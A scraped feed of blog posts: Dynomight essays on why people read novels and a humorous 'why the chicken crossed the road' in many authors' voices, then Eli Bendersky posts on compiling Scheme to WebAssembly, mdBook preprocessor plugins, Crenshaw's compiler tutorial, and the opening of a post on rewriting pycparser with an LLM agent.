theory, what\u2019s important is having the ability to read novels. But said ability is acquired by reading novels, so read some novels.</p> <p>Alternatively, say you could read novels, but you simply never have. It\u2019s plausible that the first time you have the \u201cnovel\u201d experience of taking photons into your eyes and mentally converting them into a story, this truly does feed your mind.</p> <p>Both versions of this theory suggest that reading novels has diminishing returns. That fits nicely with the fact that many people push their children to read novels while not reading any themselves. But do we really believe that after you\u2019ve read some number of novels, it\u2019s pointless to read more?</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-3-common-language","title":"Theory 3: Common language","text":"<p>I think Catcher in the Rye is a good but not great book. But I love talking about Catcher in the Rye because (1) all North Americans seem to have read it, and (2) whenever I ask someone to tell me how they feel about Holden Caulfield, I always seem to learn something about them.</p> <p>(I find him sympathetic.)</p> <p>If there\u2019s a group of people talking about Catcher in the Rye\u2014or The Three-Body Problem, or Infinite Jest, or Don Quixote\u2014then you benefit from being able to participate. The cynic might argue that this is zero-sum status competition. But I don\u2019t think that\u2019s most of it. Because, at least in my social circles, people feel boorish talking about books if not everyone has read them. So these conversations only happen if everyone has read the book in question.</p> <p>Ultimately, we\u2019re all alone in the world, and trying to connect with each other by pushing air through our throat meat. With more shared cultural context, those meat sounds are more meaningful, so we can all feel less alone.</p> <p>True. But shared context can come from other things, too, like traveling to the same places, or watching the same sports, or practicing the same skills or hobbies. So what makes books special? The two answers I see are:</p> <ol> <li>Nothing. If you think they\u2019re better than other types of cultural context, that\u2019s because you\u2019re a book person.</li> <li>Books leave more room for interpretation. Maybe Don Quixote is a fanatic, maybe he\u2019s an idealist, maybe he\u2019s a \u201cwise fool\u201d. It\u2019s debatable. But there\u2019s no doubt who won the last World Cup.</li> </ol> <p>I lean weakly towards the first answer. Novels are a useful form of social context. But that\u2019s a side benefit. It\u2019s not why we read most books.</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-4-legible-mind-space","title":"Theory 4: Legible mind-space","text":"<p>Maybe novels are just another form of entertainment. OK. But say you tried to tell the same story as a novel or as movie / podcast / opera / interpretive dance performance. Different formats will be better in different ways. One advantage I see for novels is that they make it natural to explore the interior worlds of the characters.</p> <p>Some movies have voice-overs where characters explain what they\u2019re thinking. But this is generally considered cringe and a poor use of the medium. Meanwhile, many books are mostly about exploring what the characters are thinking.</p> <p>Thoughts are worth exploring. If you want to explore thoughts, maybe novels are the best way to do that.</p> <p>Aside : I\u2019ve mentioned before that I think My Brilliant Friend is the best TV show ever made. Can I confess that I like it much more than the books it is based on? Because, like the books, the TV show involves a lot of what the main character is thinking, and even makes heavy use of voice-overs. So maybe other mediums have unrealized potential?</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-5-purity-of-vision","title":"Theory 5: Purity of vision","text":"<p>Movies are expensive to make. To be financially viable, they need to target a large slice of the population. Movies also reflect the combined efforts of many people. Both of these mean that movies are a compromise between different visions.</p> <p>Novels are usually written by one person. And they\u2019re often written more for personal expression than to make money. After all, writing is fun. I mean\u2014writing is hard, but would you rather spend an afternoon holding up a shotgun microphone, cleaning a movie star\u2019s trailer, or writing a novel?</p> <p>To quantify this, some searching suggests that around 10,000 feature films are released each year, as compared to around 1,000,000 novels. (Does one in 7,000 people really write a novel each year?) That\u2019s two orders of magnitude. So if you want to hear a truly unique story, a pure vision of one person, maybe novels are where you\u2019ll find it.</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-6-all-these-theories-are-stupid","title":"Theory 6: All these theories are stupid","text":"<p>Or: Maybe the point of reading War and Peace is that War and Peace is incredible and obviously one of the greatest pieces of art ever made in any medium. No one who reads War and Peace can question the value of what they\u2019ve done. What are we talking about?</p> <p>Fair. I definitely feel like I\u2019m living my best life when I read War and Peace. But I also feel like I\u2019m living an OK-ish life when I read a novel about Spenser, private investigator. And most novels most people read are closer to the Spenser than to War and Peace. And I still feel better spending an afternoon reading about Spenser than I would watching 99% of TV shows.</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-7-dopamine","title":"Theory 7: Dopamine","text":"<p>Or perhaps the difference is that reading is a thing you do rather than something you consume.</p> <p>This theory holds than when spend an hour slurping up short-form video, you\u2019re training yourself to sort of pull a lever in the hope that some reward is delivered to you. But if you read (or do watercolors, or meditate) you\u2019re training yourself to calmly pursue long-term goals and to sustain attention in the face of complexity.</p> <p>Sometimes I wonder if phones/apps are the most addictive thing ever created. I suspect that more people today are addicted to their phones today than were ever addicted to any drug other than caffeine or perhaps nicotine. And while a phone addiction is less physically harmful than tobacco, that phone addiction will eat a larger part of your soul.</p> <p>I think this is a big part of the explanation.</p>"},{"location":"dynomight.net/Why%20read%20novels-_20260205/#theory-8-non-fungible-time","title":"Theory 8: Non-fungible time","text":"<p>In the end, I don\u2019t think novels are the best way to spend your time. In my view no novel\u2014not even War and Peace\u2014is as good as a truly great conversation.</p> <p>But great conversations are hard to create. Sometimes you\u2019re sitting on a train, or laying in bed, or it\u2019s just been a long day and you don\u2019t have the energy to find a giant block of marble and pursue your dream of experimental sculpture. In these situations, maybe reading a novel is the best thing you could do in the category of things you could realistically do.</p> <p>Exercise for the reader: Apply these theories to blog posts.</p>"},{"location":"dynomight.net/Why%20the%20chicken%20crossed%20the%20road%2C%20according%20to%20various%20entities_20260205/","title":"Why the chicken crossed the road, according to various entities","text":"<p>\u6765\u6e90: https://dynomight.net \u94fe\u63a5: https://dynomight.net/chicken/ \u65e5\u671f: 2025-12-04T00:00:00+00:00</p> <p>When I started this blog, I promised myself that I would always steer into weirdness. (As they say, \u201cGet busy being weird, or get busy dying.\u201d) While time has shown there are limits to what y\u2019all will tolerate [1 2 3 4] I still sometimes feel a need to publish something that\u2019s pure exuberant stupidity.</p> <p>Thus, I present:</p> <p>WHY DID THE CHICKEN CROSS THE ROAD ACCORDING TO VARIOUS PEOPLE OR OTHER ENTITIES</p> <p>Q) Why did the chicken cross the road?</p> <p>A) The chicken ain\u2019t fussy. Everybody gotta be somewhere. The chicken been on this side a long time and never suffered none for it. The chicken don\u2019t see no obvious benefit to the other side. But the talk of the town is nothing but crossing, and the chicken can\u2019t help but go see what got everyone so stirred up.</p> <p>(Mark Twain)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) The outcome would be best if no one crossed. However, if other chickens do cross, then the outcome would be better if this chicken also crossed. The chicken rejects the Kantian universalism. So the chicken crosses.</p> <p>(Derek Parfit)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) You were a beautiful little chick  The whole world was before you  You greased your wattles and crossed the road  Sure it would last forever</p> <p>Now it\u2019s a cold morning and you\u2019re driving to work  Cursing all the cockerels in your way  How did you get here  Where did that little chick go</p> <p>(Pink Floyd)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) It didn\u2019t. There is no chicken. You are the road. You and the sides are in an entangled macrostate. The chicken is an emergent property of the superposition. The chicken abhors being measured. A team of plucky chemists rush to inject enough decoherence to collapse the wavefunction before the chicken can consume the lightcone.</p> <p>(Christopher Nolan)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) Chicken</p> <p>C H I C K E N</p> <p>3, 8, 9, 3, 11, 5, 14</p> <p>11, 9, 3, 8 14, 3, 5</p> <p>gcd(11^(9 + 3) - 8, 14), 3 \u00d7 5</p> <p>7, 15</p> <p>G O</p> <p>Go</p> <p>(Ramanujan)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) For sex. Neither glamorized nor gross, possibly added for commercial reasons, possibly to make some point about sex\u2019s place in real life. It\u2019s all very unclear.</p> <p>(Paul Thomas Anderson)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) Did it cross the road, though? Did it? Sure, the chicken is associated with crossing. And it\u2019s mechanistically possible for a chicken to cross a road. It\u2019s plausible the chicken crossed the road. But maybe the chicken and the crossing were both caused by something else. Or maybe the road crossed the chicken. This is why we have RCTs. Come on, people!</p> <p>(Dynomight)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) Once there was a dragon who watched over the chicken village. The chickens begged the dragon, \u201cPlease let us have a road, so that we might cross back and forth!\u201d</p> <p>\u201cA road?\u201d the dragon asked. \u201cAre you sure?\u201d</p> <p>\u201cYes!\u201d the chickens answered. \u201cA road! We wish for nothing but a road to cross, and then we will be happy forever and ever!\u201d</p> <p>[7000 words redacted]</p> <p>And thus, all mass-energy in the universe was converted to chicken-torture annihilators. Makes you think.</p> <p>(LessWrong)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) We were out on the edge of the farm when the diethyltryptamine took hold. Beaky screamed something about coccidiostats in our feed and made a break for it, totally out of control. Before I could stop him, I heard the voice of God say, \u201cScrapples: The road awaits.\u201d Suddenly I was standing on the median, cars screaming past, a group a baby ducks asking where the mountains of peas I\u2019d promised them were.</p> <p>(Hunter S. Thompson)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) The chicken\u2019s crossing is not a voluntary act but the unconscious actualization of a class habitus: raised in a coop whose symbolic boundaries naturalize the road as a site of danger and prestige, the chicken embodies the field\u2019s doxa that \u201creal\u201d chickens must invest in the illusio of reaching the median. While the chicken never doubts the legitimacy of the crossing rules, crossing is not about the other side, but a performance of distinction that ultimately perpetuates the same field of species domination that produced it.</p> <p>(Pierre Bourdieu)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) grug on one side</p> <p>grug see other side</p> <p>grug chicken</p> <p>many metal box speed by very fast very volume</p> <p>metal box seem to stay on black land strip</p> <p>grug think better if metal box not hit grug because box hard and grug small soft chicken</p> <p>grug wait a while</p> <p>when no metal box for a while also often no metal box for a while after</p> <p>largest gap between metal box around 20 minutes</p> <p>grug wait until no metal box for 10 minutes then grug cross</p> <p>no metal box come</p> <p>grug safe</p> <p>other side also fine</p> <p>maybe cross back someday</p> <p>grug think side not matter too much</p> <p>grug enjoy chicken life either side same</p> <p>chicken life pretty good</p> <p>grug hope you also have life as good as grug chicken life</p> <p>groodbye from grug</p> <p>(grug)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) Before there was chicken the road was waiting. The road is empty. Dust on your hackles. Heat rises in shimmering waves. No way to see what\u2019s coming. How did it come to this. How a chicken supposed to move with roads everywhere. Creosote blows in from the mesa. Nothing left but to cross. You cross and nothing happens. A few minutes later a car stops but you don\u2019t turn around. A door opens and you hear a click. Then the car is gone.</p> <p>(Cormac McCarthy)</p> <p>Q) Why did the chicken cross the road?</p> <p>A) For food.</p> <p>(An actual chicken)</p> <p>Requests: Peter Singer, Ayn Rand, Judith Butler, Bertrand Russell, Andrei Tarkovsky, the mother hen, a junglefowl, an SSRI, Singapore, the chicken\u2019s hypothalamus.</p>"},{"location":"eli.thegreenplace.net/","title":"eli.thegreenplace.net","text":"<p>\u7f51\u7ad9: https://eli.thegreenplace.net RSS: https://eli.thegreenplace.net/feeds/all.atom.xml</p>"},{"location":"eli.thegreenplace.net/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>Rewriting pycparser with the help of an LLM_20260205</li> <li>Compiling Scheme to WebAssembly_20260205</li> <li>Summary of reading- October - December 2025_20260205</li> <li>Plugins case study- mdBook preprocessors_20260205</li> <li>Revisiting -Let's Build a Compiler-_20260205</li> </ul>"},{"location":"eli.thegreenplace.net/Compiling%20Scheme%20to%20WebAssembly_20260205/","title":"Compiling Scheme to WebAssembly","text":"<p>\u6765\u6e90: https://eli.thegreenplace.net \u94fe\u63a5: https://eli.thegreenplace.net/2026/compiling-scheme-to-webassembly/ \u65e5\u671f: 2026-01-17T14:37:00-08:00</p> <p>One of my oldest open-source projects - Bob - has celebrated 15 a couple of months ago. Bob is a suite of implementations of the Scheme programming language in Python, including an interpreter, a compiler and a VM. Back then I was doing some hacking on CPython internals and was very curious about how CPython-like bytecode VMs work; Bob was an experiment to find out, by implementing one from scratch for R5RS Scheme.</p> <p>Several months later I added a C++ VM to Bob, as an exercise to learn how such VMs are implemented in a low-level language without all the runtime support Python provides; most importantly, without the built-in GC. The C++ VM in Bob implements its own mark-and-sweep GC.</p> <p>After many quiet years (with just a sprinkling of cosmetic changes, porting to GitHub, updates to Python 3, etc), I felt the itch to work on Bob again just before the holidays. Specifically, I decided to add another compiler to the suite - this one from Scheme directly to WebAssembly.</p> <p>The goals of this effort were two-fold:</p> <ol> <li>Experiment with lowering a real, high-level language like Scheme to WebAssembly. Experiments like the recent Let's Build a Compiler compile toy languages that are at the C level (no runtime). Scheme has built-in data structures, lexical closures, garbage collection, etc. It's much more challenging.</li> <li>Get some hands-on experience with the WASM GC extension [1]. I have several samples of using WASM GC in the wasm-wat-samples repository, but I really wanted to try it for something \"real\".</li> </ol> <p>Well, it's done now; here's an updated schematic of the Bob project:</p> <p></p> <p>The new part is the rightmost vertical path. A WasmCompiler class lowers parsed Scheme expressions all the way down to WebAssembly text, which can then be compiled to a binary and executed using standard WASM tools [2].</p>"},{"location":"eli.thegreenplace.net/Compiling%20Scheme%20to%20WebAssembly_20260205/#highlights","title":"Highlights","text":"<p>The most interesting aspect of this project was working with WASM GC to represent Scheme objects. As long as we properly box/wrap all values in <code>ref</code>s, the underlying WASM execution environment will take care of the memory management.</p> <p>For Bob, here's how some key Scheme objects are represented:</p> <pre><code>;; PAIR holds the car and cdr of a cons cell.\n(type $PAIR (struct (field (mut (ref null eq))) (field (mut (ref null eq)))))\n\n;; BOOL represents a Scheme boolean. zero -&gt; false, nonzero -&gt; true.\n(type $BOOL (struct (field i32)))\n\n;; SYMBOL represents a Scheme symbol. It holds an offset in linear memory\n;; and the length of the symbol name.\n(type $SYMBOL (struct (field i32) (field i32)))\n</code></pre> <p><code>$PAIR</code> is of particular interest, as it may contain arbitrary objects in its fields; <code>(ref null eq)</code> means \"a nullable reference to something that has identity\". <code>ref.test</code> can be used to check - for a given reference - the run-time type of the value it refers to.</p> <p>You may wonder - what about numeric values? Here WASM has a trick - the <code>i31</code> type can be used to represent a reference to an integer, but without actually boxing it (one bit is used to distinguish such an object from a real reference). So we don't need a separate type to hold references to numbers.</p> <p>Also, the <code>$SYMBOL</code> type looks unusual - how is it represented with two numbers? The key to the mystery is that WASM has no built-in support for strings; they should be implemented manually using offsets to linear memory. The Bob WASM compiler emits the string values of all symbols encountered into linear memory, keeping track of the offset and length of each one; these are the two numbers placed in <code>$SYMBOL</code>. This also allows to fairly easily implement the string interning feature of Scheme; multiple instances of the same symbol will only be allocated once.</p> <p>Consider this trivial Scheme snippet:</p> <pre><code>(write '(10 20 foo bar))\n</code></pre> <p>The compiler emits the symbols \"foo\" and \"bar\" into linear memory as follows [3]:</p> <pre><code>(data (i32.const 2048) \"foo\")\n(data (i32.const 2051) \"bar\")\n</code></pre> <p>And looking for one of these addresses in the rest of the emitted code, we'll find:</p> <pre><code>(struct.new $SYMBOL (i32.const 2051) (i32.const 3))\n</code></pre> <p>As part of the code for constructing the constant <code>cons</code> list representing the argument to <code>write</code>; address 2051 and length 3: this is the symbol <code>bar</code>.</p> <p>Speaking of <code>write</code>, implementing this builtin was quite interesting. For compatibility with the other Bob implementations in my repository, <code>write</code> needs to be able to print recursive representations of arbitrary Scheme values, including lists, symbols, etc.</p> <p>Initially I was reluctant to implement all of this functionality by hand in WASM text, but all alternatives ran into challenges:</p> <ol> <li>Deferring this to the host is difficult because the host environment has no access to WASM GC references - they are completely opaque.</li> <li>Implementing it in another language (maybe C?) and lowering to WASM is also challenging for a similar reason - the other language is unlikely to have a good representation of WASM GC objects.</li> </ol> <p>So I bit the bullet and - with some AI help for the tedious parts - just wrote an implementation of <code>write</code> directly in WASM text; it wasn't really that bad. I import only two functions from the host:</p> <pre><code>(import \"env\" \"write_char\" (func $write_char (param i32)))\n(import \"env\" \"write_i32\" (func $write_i32 (param i32)))\n</code></pre> <p>Though emitting integers directly from WASM isn't hard, I figured this project already has enough code and some host help here would be welcome. For all the rest, only the lowest level <code>write_char</code> is used. For example, here's how booleans are emitted in the canonical Scheme notation (<code>#t</code> and <code>#f</code>):</p> <pre><code>(func $emit_bool (param $b (ref $BOOL))\n    (call $emit (i32.const 35)) ;; '#'\n    (if (i32.eqz (struct.get $BOOL 0 (local.get $b)))\n        (then (call $emit (i32.const 102))) ;; 'f'\n        (else (call $emit (i32.const 116))) ;; 't'\n    )\n)\n</code></pre>"},{"location":"eli.thegreenplace.net/Compiling%20Scheme%20to%20WebAssembly_20260205/#conclusion","title":"Conclusion","text":"<p>This was a really fun project, and I learned quite a bit about realistic code emission to WASM. Feel free to check out the source code of WasmCompiler - it's very well documented. While it's a bit over 1000 LOC in total [4], more than half of that is actually WASM text snippets that implement the builtin types and functions needed by a basic Scheme implementation.</p> [1] The GC proposal is documented here. It was officially added to the WASM spec in Oct 2023. [2] In Bob this is currently done with <code>bytecodealliance/wasm-tools</code> for the text-to-binary conversion and Node.js for the execution environment, but this can change in the future. I actually wanted to use Python bindings to wasmtime, but these don't appear to support WASM GC yet. --- --- [3] 2048 is just an arbitrary offset the compiler uses as the beginning of the section for symbols in memory. We could also use the multiple memories feature of WASM and dedicate a separate linear memory just for symbols. --- --- [4] To be clear, this is just the WASM compiler class; it uses the <code>Expr</code> representation of Scheme that is created by Bob's parser (and lexer); the code of these other components is shared among all Bob implementations and isn't counted here. --- ---"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/","title":"Plugins case study: mdBook preprocessors","text":"<p>\u6765\u6e90: https://eli.thegreenplace.net \u94fe\u63a5: https://eli.thegreenplace.net/2025/plugins-case-study-mdbook-preprocessors/ \u65e5\u671f: 2025-12-17T18:11:00-08:00</p> <p>mdBook is a tool for easily creating books out of Markdown files. It's very popular in the Rust ecosystem, where it's used (among other things) to publish the official Rust book.</p> <p>mdBook has a simple yet effective plugin mechanism that can be used to modify the book output in arbitrary ways, using any programming language or tool. This post describes the mechanism and how it aligns with the fundamental concepts of plugin infrastructures.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#mdbook-preprocessors","title":"mdBook preprocessors","text":"<p>mdBook's architecture is pretty simple: your contents go into a directory tree of Markdown files. mdBook then renders these into a book, with one file per chapter. The book's output is HTML by default, but mdBook supports other outputs like PDF.</p> <p>The preprocessor mechanism lets us register an arbitrary program that runs on the book's source after it's loaded from Markdown files; this program can modify the book's contents in any way it wishes before it all gets sent to the renderer for generating output.</p> <p></p> <p>The official documentation explains this process very well.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#sample-plugin","title":"Sample plugin","text":"<p>I rewrote my classical \"nacrissist\" plugin for mdBook; the code is available here.</p> <p>In fact, there are two renditions of the same plugin there:</p> <ol> <li>One in Python, to demonstrate how mdBook can invoke preprocessors written in any programming language.</li> <li>One in Rust, to demonstrate how mdBook exposes an application API to plugins written in Rust (since mdBook is itself written in Rust).</li> </ol>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#fundamental-plugin-concepts-in-this-case-study","title":"Fundamental plugin concepts in this case study","text":"<p>Let's see how this case study of mdBook preprocessors measures against the Fundamental plugin concepts that were covered several times on this blog.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#discovery","title":"Discovery","text":"<p>Discovery in mdBook is very explicit. For every plugin we want mdBook to use, it has to be listed in the project's <code>book.toml</code> configuration file. For example, in the code sample for this post, the Python narcissist plugin is noted in <code>book.toml</code> as follows:</p> <pre><code>[preprocessor.narcissistpy]\ncommand = \"python3 ../preprocessor-python-narcissist/narcissist.py\"\n</code></pre> <p>Each preprocessor is a command for <code>mdBook</code> to execute in a sub-process. Here it uses Python, but it can be anything else that can be validly executed.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#registration","title":"Registration","text":"<p>For the purpose of registration, <code>mdBook</code> actually invokes the plugin command twice. The first time, it passes the arguments <code>supports &lt;renderer&gt;</code> where <code>&lt;renderer&gt;</code> is the name of the renderer (e.g. <code>html</code>). If the command returns 0, it means the preprocessor supports this renderer; otherwise, it doesn't.</p> <p>In the second invocation, <code>mdBook</code> passes some metadata plus the entire book in JSON format to the preprocessor through stdin, and expects the preprocessor to return the modified book as JSON to stdout (using the same schema).</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#hooks","title":"Hooks","text":"<p>In terms of hooks, <code>mdBook</code> takes a very coarse-grained approach. The preprocessor gets the entire book in a single JSON object (along with a context object that contains metadata), and is expected to emit the entire modified book in a single JSON object. It's up to the preprocessor to figure out which parts of the book to read and which parts to modify.</p> <p>Given that books and other documentation typically have limited sizes, this is a reasonable design choice. Even tens of MiB of JSON-encoded data are very quick to pass between sub-processes via stdout and marshal/unmarshal. But we wouldn't be able to implement Wikipedia using this design.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#exposing-an-application-api-to-plugins","title":"Exposing an application API to plugins","text":"<p>This is tricky, given that the preprocessor mechanism is language-agnostic. Here, <code>mdBook</code> offers some additional utilities to preprocessors implemented in Rust, however. These get access to <code>mdBook</code>'s API to unmarshal the JSON representing the context metadata and book's contents. <code>mdBook</code> offers the Preprocessor trait Rust preprocessors can implement, which makes it easier to wrangle the book's contents. See my Rust version of the narcissist preprocessor for a basic example of this.</p>"},{"location":"eli.thegreenplace.net/Plugins%20case%20study-%20mdBook%20preprocessors_20260205/#renderers-backends","title":"Renderers / backends","text":"<p>Actually, <code>mdBook</code> has another plugin mechanism, but it's very similar conceptually to preprocessors. A renderer (also called a backend in some of <code>mdBook</code>'s own doc pages) takes the same input as a preprocessor, but is free to do whatever it wants with it. The default renderer emits the HTML for the book; other renderers can do other things.</p> <p>The idea is that the book can go through multiple preprocessors, but at the end a single renderer.</p> <p>The data a renderer receives is exactly the same as a preprocessor - JSON encoded book contents. Due to this similarity, there's no real point getting deeper into renderers in this post.</p>"},{"location":"eli.thegreenplace.net/Revisiting%20-Let%27s%20Build%20a%20Compiler-_20260205/","title":"Revisiting \"Let's Build a Compiler\"","text":"<p>\u6765\u6e90: https://eli.thegreenplace.net \u94fe\u63a5: https://eli.thegreenplace.net/2025/revisiting-lets-build-a-compiler/ \u65e5\u671f: 2025-12-09T20:40:00-08:00</p> <p>There's an old compiler-building tutorial that has become part of the field's lore: the Let's Build a Compiler series by Jack Crenshaw (published between 1988 and 1995).</p> <p>I ran into it in 2003 and was very impressed, but it's now 2025 and this tutorial is still being mentioned quite often in Hacker News threads. Why is that? Why does a tutorial from 35 years ago, built in Pascal and emitting Motorola 68000 assembly - technologies that are virtually unknown for the new generation of programmers - hold sway over compiler enthusiasts? I've decided to find out.</p> <p>The tutorial is easily available and readable online, but just re-reading it seemed insufficient. So I've decided on meticulously translating the compilers built in it to Python and emit a more modern target - WebAssembly. It was an enjoyable process and I want to share the outcome and some insights gained along the way.</p> <p>The result is this code repository. Of particular interest is the TUTORIAL.md file, which describes how each part in the original tutorial is mapped to my code. So if you want to read the original tutorial but play with code you can actually easily try on your own, feel free to follow my path.</p>"},{"location":"eli.thegreenplace.net/Revisiting%20-Let%27s%20Build%20a%20Compiler-_20260205/#a-sample","title":"A sample","text":"<p>To get a taste of the input language being compiled and the output my compiler generates, here's a sample program in the KISS language designed by Jack Crenshaw:</p> <pre><code>var X=0\n\n { sum from 0 to n-1 inclusive, and add to result }\n procedure addseq(n, ref result)\n     var i, sum  { 0 initialized }\n     while i &lt; n\n         sum = sum + i\n         i = i + 1\n     end\n     result = result + sum\n end\n\n program testprog\n begin\n     addseq(11, X)\n end\n .\n</code></pre> <p>It's from part 13 of the tutorial, so it showcases procedures along with control constructs like the <code>while</code> loop, and passing parameters both by value and by reference. Here's the WASM text generated by my compiler for part 13:</p> <pre><code>(module\n  (memory 8)\n  ;; Linear stack pointer. Used to pass parameters by ref.\n  ;; Grows downwards (towards lower addresses).\n  (global $__sp (mut i32) (i32.const 65536))\n\n  (global $X (mut i32) (i32.const 0))\n\n  (func $ADDSEQ (param $N i32) (param $RESULT i32)\n    (local $I i32)\n    (local $SUM i32)\n    loop $loop1\n      block $breakloop1\n        local.get $I\n        local.get $N\n        i32.lt_s\n        i32.eqz\n        br_if $breakloop1\n        local.get $SUM\n        local.get $I\n        i32.add\n        local.set $SUM\n        local.get $I\n        i32.const 1\n        i32.add\n        local.set $I\n        br $loop1\n      end\n    end\n    local.get $RESULT\n    local.get $RESULT\n    i32.load\n    local.get $SUM\n    i32.add\n    i32.store\n  )\n\n  (func $main (export \"main\") (result i32)\n    i32.const 11\n    global.get $__sp      ;; make space on stack\n    i32.const 4\n    i32.sub\n    global.set $__sp\n    global.get $__sp\n    global.get $X\n    i32.store\n    global.get $__sp    ;; push address as parameter\n    call $ADDSEQ\n    ;; restore parameter X by ref\n    global.get $__sp\n    i32.load offset=0\n    global.set $X\n    ;; clean up stack for ref parameters\n    global.get $__sp\n    i32.const 4\n    i32.add\n    global.set $__sp\n    global.get $X\n  )\n)\n</code></pre> <p>You'll notice that there is some trickiness in the emitted code w.r.t. handling the by-reference parameter (my previous post deals with this issue in more detail). In general, though, the emitted code is inefficient - there is close to 0 optimization applied.</p> <p>Also, if you're very diligent you'll notice something odd about the global variable <code>X</code> - it seems to be implicitly returned by the generated <code>main</code> function. This is just a testing facility that makes my compiler easy to test. All the compilers are extensively tested - usually by running the generated WASM code [1] and verifying expected results.</p>"},{"location":"eli.thegreenplace.net/Revisiting%20-Let%27s%20Build%20a%20Compiler-_20260205/#insights-what-makes-this-tutorial-so-special","title":"Insights - what makes this tutorial so special?","text":"<p>While reading the original tutorial again, I had on opportunity to reminisce on what makes it so effective. Other than the very fluent and conversational writing style of Jack Crenshaw, I think it's a combination of two key factors:</p> <ol> <li>The tutorial builds a recursive-descent parser step by step, rather than giving a long preface on automata and table-based parser generators. When I first encountered it (in 2003), it was taken for granted that if you want to write a parser then lex + yacc are the way to go [2]. Following the development of a simple and clean hand-written parser was a revelation that wholly changed my approach to the subject; subsequently, hand-written recursive-descent parsers have been my go-to approach for almost 20 years now.</li> <li>Rather than getting stuck in front-end minutiae, the tutorial goes straight to generating working assembly code, from very early on. This was also a breath of fresh air for engineers who grew up with more traditional courses where you spend 90% of the time on parsing, type checking and other semantic analysis and often run entirely out of steam by the time code generation is taught.</li> </ol> <p>To be honest, I don't think either of these are a big problem with modern resources, but back in the day the tutorial clearly hit the right nerve with many people.</p>"},{"location":"eli.thegreenplace.net/Revisiting%20-Let%27s%20Build%20a%20Compiler-_20260205/#what-else-does-it-teach-us","title":"What else does it teach us?","text":"<p>Jack Crenshaw's tutorial takes the syntax-directed translation approach, where code is emitted while parsing , without having to divide the compiler into explicit phases with IRs. As I said above, this is a fantastic approach for getting started, but in the latter parts of the tutorial it starts showing its limitations. Especially once we get to types, it becomes painfully obvious that it would be very nice if we knew the types of expressions before we generate code for them.</p> <p>I don't know if this is implicated in Jack Crenshaw's abandoning the tutorial at some point after part 14, but it may very well be. He keeps writing how the emitted code is clearly sub-optimal [3] and can be improved, but IMHO it's just not that easy to improve using the syntax-directed translation strategy. With perfect hindsight vision, I would probably use Part 14 (types) as a turning point - emitting some kind of AST from the parser and then doing simple type checking and analysis on that AST prior to generating code from it.</p>"},{"location":"eli.thegreenplace.net/Revisiting%20-Let%27s%20Build%20a%20Compiler-_20260205/#conclusion","title":"Conclusion","text":"<p>All in all, the original tutorial remains a wonderfully readable introduction to building compilers. This post and the GitHub repository it describes are a modest contribution that aims to improve the experience of folks reading the original tutorial today and not willing to use obsolete technologies. As always, let me know if you run into any issues or have questions!</p> [1] This is done using the Python bindings to wasmtime. [2] By the way, gcc switched from YACC to hand-written recursive-descent parsing in the 2004-2006 timeframe, and Clang has been implemented with a recursive-descent parser from the start (2007). --- --- [3] Concretely: when we compile <code>subexpr1 + subexpr2</code> and the two sides have different types, it would be mighty nice to know that before we actually generate the code for both sub-expressions. But the syntax-directed translation approach just doesn't work that way. To be clear: it's easy to generate working code; it's just not easy to generate optimal code without some sort of type analysis that's done before code is actually generated. --- ---"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/","title":"Rewriting pycparser with the help of an LLM","text":"<p>\u6765\u6e90: https://eli.thegreenplace.net \u94fe\u63a5: https://eli.thegreenplace.net/2026/rewriting-pycparser-with-the-help-of-an-llm/ \u65e5\u671f: 2026-02-04T19:35:00-08:00</p> <p>pycparser is my most widely used open source project (with ~20M daily downloads from PyPI [1]). It's a pure-Python parser for the C programming language, producing ASTs inspired by Python's own. Until very recently, it's been using PLY: Python Lex-Yacc for the core parsing.</p> <p>In this post, I'll describe how I collaborated with an LLM coding agent (Codex) to help me rewrite pycparser to use a hand-written recursive-descent parser and remove the dependency on PLY. This has been an interesting experience and the post contains lots of information and is therefore quite long; if you're just interested in the final result, check out the latest code of pycparser - the <code>main</code> branch already has the new implementation.</p> <p></p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-issues-with-the-existing-parser-implementation","title":"The issues with the existing parser implementation","text":"<p>While pycparser has been working well overall, there were a number of nagging issues that persisted over years.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#parsing-strategy-yacc-vs-hand-written-recursive-descent","title":"Parsing strategy: YACC vs. hand-written recursive descent","text":"<p>I began working on pycparser in 2008, and back then using a YACC-based approach for parsing a whole language like C seemed like a no-brainer to me. Isn't this what everyone does when writing a serious parser? Besides, the K&amp;R2 book famously carries the entire grammar of the C99 language in an appendix - so it seemed like a simple matter of translating that to PLY-yacc syntax.</p> <p>And indeed, it wasn't too hard, though there definitely were some complications in building the ASTs for declarations (C's gnarliest part).</p> <p>Shortly after completing pycparser, I got more and more interested in compilation and started learning about the different kinds of parsers more 